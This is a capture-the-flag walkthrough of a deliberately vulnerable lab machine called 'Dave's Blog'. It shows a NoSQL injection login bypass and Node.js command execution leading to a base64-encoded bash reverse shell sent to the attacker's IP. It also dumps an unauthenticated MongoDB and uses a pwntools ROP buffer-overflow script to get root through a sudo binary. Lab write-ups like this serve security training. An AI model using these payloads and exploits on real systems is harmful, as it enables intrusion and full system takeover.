**Dave's Blog**

My friend Dave made his own blog! You should go check it out.

# Flag 1

*Hint: What's there to inject when there's no SQL?*

## Services enumeration

Let's start by enumerating the services running on the target:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
3000/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
~~~

## Web enumeration

Connecting on the web server shows a basic blog with only 1 post. No link is available, but the post tells us that it is using a NoSQL database.

There is a `robots.txt` file that discloses an `/admin` location:

~~~
kali@kali:/data/Dave_s_Blog$ curl -s http://10.10.139.182/robots.txt
User-Agent: *
Disallow: /admin
~~~

## Admin

Connecting to `/admin` shows an authentication form. The source code of the page reveals that the credentials are passed as JSON.


```html
<!DOCTYPE html>
<html>

<head>
  <title>Login | Dave's Blog</title>
  <link rel='stylesheet' href='/stylesheets/style.css' />
</head>

<body>
  <h1>Login</h1>

  <form method="POST">
    <input type="text" name="username" placeholder="username" /> <br />
    <input type="password" name="password" placeholder="password" /> <br />
    <input type="submit" value="Log in" />
  </form>

  Don't have an account? Click <a href="/admin/register">here</a> to register!

  <script>
    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }
  </script>
</body>

</html>
```

Checking on the Internet how to bypass JSON authentication led me to this post (https://book.hacktricks.xyz/pentesting-web/nosql-injection) where I was able to replicate the examples by injecting `{"$ne": "foo"}` in the `username` and `password` fields:

~~~
kali@kali:/data/Dave_s_Blog$ curl -D header.txt -H "Content-Type: application/json" -XPOST -d '{"username":{"$ne": "foo"},"password":{"$ne": "foo"}}' http://10.10.139.182/admin
Found. Redirecting to /admin
kali@kali:/data/Dave_s_Blog$ cat header.txt 
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 23 Sep 2020 07:05:04 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 28
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ3MDR9.nioG_MjIcRGJ3PObm0QcDv_eIqRU6baBCYAi7aRWVPw; Path=/
Location: /admin
Vary: Accept

~~~

It provided me with a JWT token that we can decode (base64). The `password` field contains the first flag.

~~~
kali@kali:/data/Dave_s_Blog$ export IFS=".";jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ3MDR9.nioG_MjIcRGJ3PObm0QcDv_eIqRU6baBCYAi7aRWVPw";for j in $jwt; do echo "$j" | base64 -d;done
{"alg":"HS256","typ":"JWT"}{"isAdmin":true,"_id":"5ec6e5cf1dc4d364bf864107","username":"dave","password":"THM{SuperSecureAdminPassword123}","__v":0,"iat":1600844704}�*base64: invalid input
~~~

Flag 1: `THM{SuperSecureAdminPassword123}`

# Flag 2 / User flag

Now provided with credentials (`dave:THM{SuperSecureAdminPassword123}`), we can login and execute commands, as described in [this post](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44).

I was not able to execute commands using the below format:

~~~
{"exec":"require('child_process').exec('<command>');"}
~~~

But this format worked:

~~~
{"exec":"require('child_process').execSync('<command>').toString();"}
~~~

Let's make a reverse shell. We'll first encode it in base64:

~~~
$ echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ==
~~~

Start a listener (`rlwrap nc -nlvp 4444`) and intercept the authentication request in Burp Suite and modify it as follows:

~~~
POST /admin/exec HTTP/1.1
Host: 10.10.139.182
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.139.182/admin
Content-Type: application/json
Origin: http://10.10.139.182
Content-Length: 140
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDA4NDQ4MTd9.iYAlMdDV6SaG8TWaDiMyFfS2v69HYoRgFzfUhSMJ2bo

{"exec":"require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash').toString();"}
~~~

A reverse shell is now spawned to our listener window:

~~~
kali@kali:/data/vpn$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.139.182] 47686
bash: cannot set terminal process group (814): Inappropriate ioctl for device
bash: no job control in this shell
dave@daves-blog:~/blog$ cd /home
cd /home
dave@daves-blog:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 May 21 20:27 .
drwxr-xr-x 24 root root 4096 May 21 20:28 ..
drwxr-xr-x  5 dave dave 4096 May 22 13:32 dave
dave@daves-blog:/home$ cd dave
cd dave
dave@daves-blog:~$ ls -la
ls -la
total 44
drwxr-xr-x  5 dave dave 4096 May 22 13:32 .
drwxr-xr-x  3 root root 4096 May 21 20:27 ..
lrwxrwxrwx  1 dave dave    9 May 21 20:29 .bash_history -> /dev/null
-rw-r--r--  1 dave dave  220 May 21 20:27 .bash_logout
-rw-r--r--  1 dave dave 3771 May 21 20:27 .bashrc
drwxr-xr-x  9 dave dave 4096 Sep 23 05:46 blog
drwxrwxr-x  3 dave dave 4096 May 21 20:38 .local
drwxrwxr-x 94 dave dave 4096 May 21 20:34 .npm
-rw-r--r--  1 dave dave  807 May 21 20:27 .profile
-rw-rw-r--  1 dave dave   66 May 21 20:38 .selected_editor
-rwxr-xr-x  1 root root  137 May 22 13:32 startup.sh
-rw-rw-r--  1 dave dave   38 May 21 20:45 user.txt
dave@daves-blog:~$ cat user.txt
cat user.txt
THM{5fa1f779d1835367fdcfa4741bebb88a}
~~~

# Flag 3

*Hint: mongo deeper*

MngoDB is running on port 27017 for localhost only:

~~~
dave@daves-blog:~$ netstat -putan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:53682         127.0.0.1:27017         ESTABLISHED 1050/node           
tcp        0      0 127.0.0.1:27017         127.0.0.1:53688         ESTABLISHED -                   
tcp        0      0 127.0.0.1:27017         127.0.0.1:53682         ESTABLISHED -                   
tcp        0      0 127.0.0.1:53980         127.0.0.1:27017         ESTABLISHED 1050/node           
tcp        0    612 10.10.139.182:22        10.8.50.72:37676        ESTABLISHED -                   
tcp        0      0 127.0.0.1:53688         127.0.0.1:27017         ESTABLISHED 1050/node           
tcp        0      0 127.0.0.1:27017         127.0.0.1:53980         ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      1050/node           
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.139.182:68        0.0.0.0:*                           -         
~~~

Checking on the configuration file confirms hat no password is required to connect, and that there is a `daves-blog` database:

~~~
dave@daves-blog:~/blog$ cat app.js 

[REDACTED]

mongoose.connect('mongodb://localhost:27017/daves-blog', {
  useNewUrlParser: true
});

[REDACTED]

~~~

Let's connect to the Mongo database:

~~~
dave@daves-blog:~/blog$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2020-09-23T05:44:11.028+0000 I STORAGE  [initandlisten] 
2020-09-23T05:44:11.028+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2020-09-23T05:44:11.028+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2020-09-23T05:45:46.741+0000 I CONTROL  [initandlisten] 
2020-09-23T05:45:46.819+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2020-09-23T05:45:46.819+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2020-09-23T05:45:46.819+0000 I CONTROL  [initandlisten] 
~~~

Let's select the `daves-blog` database and list the collections:

~~~
> use daves-blog
switched to db daves-blog
> db.collections
daves-blog.collections
> show collections
posts
users
whatcouldthisbes
~~~

One collection seems interesting, let's check what in it:

~~~
> db.whatcouldthisbes.find().pretty()
{
	"_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
	"whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}",
	"__v" : 0
}
~~~

Flag 3: `THM{993e107fc66844482bb5dd0e4c485d5b}`

# Flag 4

Checking dave's privileges reveals that we can execute `/uid-checker` as root with `sudo`, without password:

~~~
dave@daves-blog:~/blog$ sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
~~~

Running the executable shows an interactive menu with 2 choices, to display our user or group ID. Checking the strings discloses another flag.

~~~
dave@daves-blog:~$ strings /uid_checker 
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
puts
printf
getgid
system
getuid
strcmp
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
How did you get here???
/bin/sh
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Your UID is: %d
Your GID is: %d
THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
Wow! You found the secret function! I still need to finish it..
Invalid choice

[REDACTED]
~~~

Flag 4: `THM{runn1ng_str1ngs_1s_b4sic4lly_RE}`

# Flag 5 / Root flag

*Hint: `from pwn import *`*

Running `strings` revealed the presence of `/bin/sh`, which seems interesting, as the program is run with privileges. Let's download it and do a bit of reverse engineering.

Below is the pseudo C code reversed in Hopper:

```c
void secret() {
    puts("How did you get here???");
    system("/bin/sh");
    return;
}

int main(int arg0, int arg1) {
    puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
    gets(&var_50);
    rax = strcmp(&var_50, 0x40089b);
    if (rax == 0x0) {
            rax = printf("Your UID is: %d\n", getuid());
    }
    else {
            rax = strcmp(&var_50, 0x4008ae);
            if (rax == 0x0) {
                    rax = printf("Your GID is: %d\n", getgid());
            }
            else {
                    rax = strcmp(&var_50, "THM{runn1ng_str1ngs_1s_b4sic4lly_RE}");
                    if (rax == 0x0) {
                            rax = puts("Wow! You found the secret function! I still need to finish it..");
                    }
                    else {
                            rax = puts("Invalid choice");
                    }
            }
    }
    return rax;
}
```

As we can see, calling the `secret()` function will spawn a root shell, but the function is not called anywhere from `main()`. If we want to be able to access it, we'll need a buffer overflow. Let's use `ropstar` to automatically get the information we need:

~~~
kali@kali:/data/src/ropstar$ python3 ropstar.py /data/Dave_s_Blog/files/uid_checker

[REDACTED]

[+] Offset: 88
[*] Checking for leakless exploitation
[*] Using local target
[+] Starting local process '/data/Dave_s_Blog/files/uid_checker' argv=[b'/data/Dave_s_Blog/files/uid_checker'] : pid 6076
[*] Exploit: gets(bss); system(bss)
[*] Loading gadgets for '/data/Dave_s_Blog/files/uid_checker'
[*] 0x0000:         0x400803 pop rdi; ret
    0x0008:         0x601060 [arg0] rdi = 6295648
    0x0010:         0x4005b0
    0x0018:         0x400803 pop rdi; ret
    0x0020:         0x601060 [arg0] rdi = 6295648
    0x0028:         0x400570

[REDACTED]
~~~

Now, let's automate the exploitation with the below python script:

```python
#!/usr/bin/env python3

from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88
payload = cyclic(offset)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x4005b0)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x400570)

s = ssh(host='10.10.139.182', user='dave')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive()
```

Running our script will automatically connect (SSH) to the target, run the program and inject the payload that will overflow it to spawn a shell.

~~~
kali@kali:/data/Dave_s_Blog/files$ ./rop.py 
[+] Connecting to 10.10.139.182 on port 22: Done
[*] dave@10.10.139.182:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'sudo' on 10.10.139.182: pid 4972
b'Welcome to the UID checker!\n'
b'Enter 1 to check your UID or enter 2 to check your GID\n'
[*] Switching to interactive mode
Invalid choice
# $ id
uid=0(root) gid=0(root) groups=0(root)
# $ cd /root
# $ ls -la
total 48
drwx------  6 root root 4096 May 22 13:32 .
drwxr-xr-x 24 root root 4096 May 21 20:28 ..
lrwxrwxrwx  1 root root    9 May 21 20:30 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 21 20:26 .cache
-rw-------  1 root root  161 May 21 20:48 .dbshell
drwx------  3 root root 4096 May 21 20:26 .gnupg
drwxr-xr-x  3 root root 4096 May 21 20:26 .local
lrwxrwxrwx  1 root root    9 May 21 20:46 .mongorc.js -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 May 21 20:57 root.txt
-rw-r--r--  1 root root   66 May 21 20:44 .selected_editor
-rw-r--r--  1 root root   87 May 22 13:31 setup.sh
drwx------  2 root root 4096 May 21 17:48 .ssh
# $ cat root.txt
THM{a0a9c4f6809c84e212ac889d39b9cb48}
~~~

Root flag: `THM{a0a9c4f6809c84e212ac889d39b9cb48}`
